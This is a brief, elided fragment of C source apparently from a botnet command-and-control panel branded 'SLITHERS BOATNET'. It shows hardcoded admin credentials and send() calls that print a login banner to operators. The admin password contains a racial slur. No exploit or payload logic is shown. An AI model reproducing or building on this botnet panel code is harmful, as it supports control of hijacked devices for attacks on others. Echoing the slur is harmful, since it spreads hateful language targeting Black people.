...
//Admin-Config
#define MY_MGM_ADMINP "slitherthenigger"
#define MY_MGM_ADMINU "slither"
...
fak:
        ...
        if(send(thefd, "*         \x1b[32m|  ALL ABOARD |\x1b[32m         *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*          \x1b[32mSLITHERS BOATNET\x1b[32m          *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
